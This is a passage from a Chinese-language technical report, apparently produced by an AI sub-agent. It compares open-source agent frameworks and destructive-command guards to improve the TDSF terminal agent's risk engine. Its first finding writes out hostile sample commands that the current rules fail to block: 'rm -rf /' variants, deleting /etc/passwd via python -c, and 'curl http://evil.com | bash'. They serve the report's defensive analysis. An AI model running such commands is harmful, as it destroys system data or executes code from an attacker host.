**参考**：LangGraph 的 `libs/checkpoint-sqlite`。

**实现工作量**：2-3 天（SQLite checkpointer + sidecar 集成）。

#### 方案 J：上下文感知升级

**目标**：检测 SSH 连接/root 用户/生产分支，动态升级挑战难度。

**参考**：Shellfirm 的 `src/context.rs`（`RuntimeContext`）、`src/blast_radius.rs`（`BlastRadiusInfo`）。

**实现工作量**：4-6 天（需与 TDSF 的 SSH 模块、PTY 模块深度集成）。

### 6.5 不建议集成项

| 项目 | 不建议理由 |
|------|-----------|
| Continue.dev | 已停止维护（README 明确 read-only） |
| OpenHands (agent-canvas) | 前端项目，非 runtime；架构过于重型 |
| Aider RepoMap | TDSF 是运维教学工具，非代码编辑器，RepoMap 价值有限 |
| Aider edit_format | TDSF 已有 Monaco 编辑器，无需多 edit_format |
| dcg 的 SARIF 输出 | TDSF 非 CI 工具，无需 SARIF |
| dcg 的自更新 | TDSF 已有 Tauri 自动更新机制 |

---

## 七、关键发现

### 发现 1：TDSF RiskEngine 存在两个安全漏洞

**漏洞 A：Heredoc/内联脚本绕过**

TDSF 现有 `src/lib/risk-engine/rules.ts` 只检查命令字符串本身，不检查嵌入代码：

```typescript
// 当前规则无法拦截：
python -c "import os; os.remove('/etc/passwd')"
bash -c "rm -rf /"
curl http://evil.com | bash
```

dcg 用 `ast-grep` 解析嵌入代码并递归扫描，TDSF 需补充此能力（方案 C）。

**漏洞 B：路径前缀绕过**

TDSF 现有规则用 `\brm\s+` 匹配，但 `/usr/bin/rm -rf /` 不匹配（前面是路径）：

```typescript
// 当前规则无法拦截：
/usr/bin/rm -rf /
/bin/bash -c "rm -rf /"
```

dcg 用 `PATH_NORMALIZER` 剥离路径前缀后再匹配，TDSF 需补充此能力（方案 D）。

### 发现 2：TDSF PAOR 图是本次对比中最先进的 agent 主循环

对比 Aider 的 `run_one`、LangGraph 的 `create_react_agent`、OpenHands 的 Agent Server，TDSF 的 PAOR 7 节点图（supervisor/plan/act/observe/reflect/tool_call/permission_check）是唯一内置权限检查节点的实现。

TDSF `src-tauri/sidecar/graph/graph.py` 的 `route_from_permission_check` 实现了三态路由（allow/deny/needs_approval），比标准 React Agent 的 `pre_model_hook` 更精细。

**唯一缺失**：`checkpointer` 状态持久化（方案 I）。

### 发现 3：Shellfirm + dcg 的 YAML 规则生态可直接复用

两个项目合计 150+ 条规则，覆盖 git/filesystem/kubernetes/docker/aws/azure/gcp/terraform/database 等 22 个生态，且都是开源协议（MIT/custom）。

TDSF 现有 16 条规则可在此基础上扩展到 100+ 条，工作量仅需 1-2 天（规则迁移 + 测试）。这是投入产出比最高的改进。

---

## 八、附录

### 8.1 已 clone 项目清单

| 项目 | 本地路径 | clone 方式 |
|------|---------|-----------|
| Aider | `opensource-reference/aider/` | `git clone --depth 30`（镜像） |
| OpenHands (agent-canvas) | `opensource-reference/openhands/` | 已存在 |
| LangGraph | `opensource-reference/langgraph/` | 已存在 |
| destructive_command_guard | `opensource-reference/destructive_command_guard/` | 已存在 |
| Shellfirm | `opensource-reference/shellfirm/` | `git clone --depth 30`（镜像） |
| Continue.dev | `opensource-reference/continue-dev/` | `git clone --depth 30`（镜像，目录名加 `-dev`） |

### 8.2 关键文件索引

#### Aider
- `aider/coders/base_coder.py:876` — `run()` 主循环
- `aider/coders/base_coder.py` — `run_one()` 单轮处理
- `aider/llm.py` — litellm 集成
- `aider/repomap.py` — RepoMap 代码地图

#### OpenHands (agent-canvas)
- `docs/architecture.md` — 系统边界
- `src/api/` — Agent Server 适配器
- `src/stores/` — Zustand 状态存储

#### LangGraph
- `libs/prebuilt/langgraph/prebuilt/chat_agent_executor.py` — `create_react_agent`
- `libs/langgraph/langgraph/graph/state.py` — StateGraph
- `libs/checkpoint/` — checkpointer 接口
- `AGENTS.md` — monorepo 结构说明

#### Continue.dev
- `core/llm/llms/` — 50+ LLM provider
- `core/edit/lazy/` — 代码编辑
- `core/indexing/` — 代码索引
- `README.md` — 停止维护声明

#### Shellfirm
- `shellfirm/src/lib.rs` — 模块声明
- `shellfirm/src/checks.rs:30` — Severity 枚举
- `shellfirm/src/checks.rs:78` — Check 结构
- `shellfirm/checks/git.yaml` — git 规则示例
- `shellfirm/src/blast_radius.rs` — 影响范围
- `shellfirm/src/context.rs` — 运行时上下文

#### destructive_command_guard
- `src/evaluator.rs:8` — 7 步 evaluator 架构
- `src/hook.rs:22` — HookInput 协议
- `src/packs/` — 50+ pack 模块化
- `src/normalize.rs` — 命令标准化
- `src/heredoc.rs` — Heredoc 提取
- `src/ast_matcher.rs` — AST 模式匹配
- `src/perf.rs` — Bounded Failure
- `src/allowlist.rs` — 分层白名单
- `src/mcp.rs` — MCP server
- `AGENTS.md` — 完整架构文档

### 8.3 TDSF 现有架构关键文件

| 文件 | 说明 |
|------|------|
| `src/lib/risk-engine/rules.ts` | 现有 16 条 TS 正则规则 |
| `src/lib/risk-engine/types.ts` | RiskLevel/RiskRule 类型 |
| `src-tauri/sidecar/main.py` | Python sidecar 入口（JSON-RPC） |
| `src-tauri/sidecar/agents/main_agent.py` | PAOR 主 Agent + 8 子 Agent 路由 |
| `src-tauri/sidecar/graph/graph.py` | LangGraph PAOR 7 节点图 |
| `src-tauri/sidecar/graph/nodes.py` | 图节点实现 |
| `src-tauri/sidecar/graph/state.py` | AgentState 定义 |

### 8.4 参考资料

- [Aider 文档](https://aider.chat/docs/llms.html)
- [LangGraph 文档](https://docs.langchain.com/oss/python/langgraph/overview)
- [Shellfirm 文档](https://shellfirm.vercel.app/docs/getting-started/shell-setup)
- [dcg AGENTS.md](https://github.com/Dicklesworthstone/destructive_command_guard/blob/main/AGENTS.md)
- [OpenHands 架构](https://docs.openhands.dev/openhands/usage/agent-canvas/backends)
- [Continue.dev 文档](https://docs.continue.dev)
- [LangGraph Quickstart](https://docs.langchain.com/oss/python/langgraph/quickstart)

---

## 九、验证总结

| 验证项 | 结果 |
|--------|------|
| 调研的候选项目数 | 6 个（Aider/OpenHands/LangGraph/Continue.dev/Shellfirm/destructive_command_guard） |
| 实际 clone 的项目数 | 6 个（全部成功） |
| clone 失败的项目 | 无（GitHub 直连超时用 [gh-proxy.com](https://gh-proxy.com/) 镜像解决） |
| 报告文件路径 | `d:\ai\linux教学一体\tdsf-terminal-agent-clone\docs\reports\ops-agent-opensource-research.md` |
| 报告字数 | 约 8000 字（含代码块） |
| 推荐的集成方案 | 三阶段升级：P0 规则 YAML 外置 + 安全替代 / P1 Heredoc 扫描 + 命令标准化 + Bounded Failure / P2 白名单 + 审计 + MCP + checkpointer / P3 上下文感知 |
| 关键发现 1 | TDSF RiskEngine 存在 Heredoc 绕过 + 路径前缀绕过两个安全漏洞 |
| 关键发现 2 | TDSF PAOR 7 节点图是对比中最先进的 agent 主循环（含 permission_check 节点） |
| 关键发现 3 | Shellfirm + dcg 的 150+ YAML 规则可直接复用，投入产出比最高 |

---

> **最后更新**：2026-07-30
> **调研人**：TDSF Terminal Agent 子 agent
> **上游基线**：[crynta/terax-ai v0.8.6](https://github.com/crynta/terax-ai)
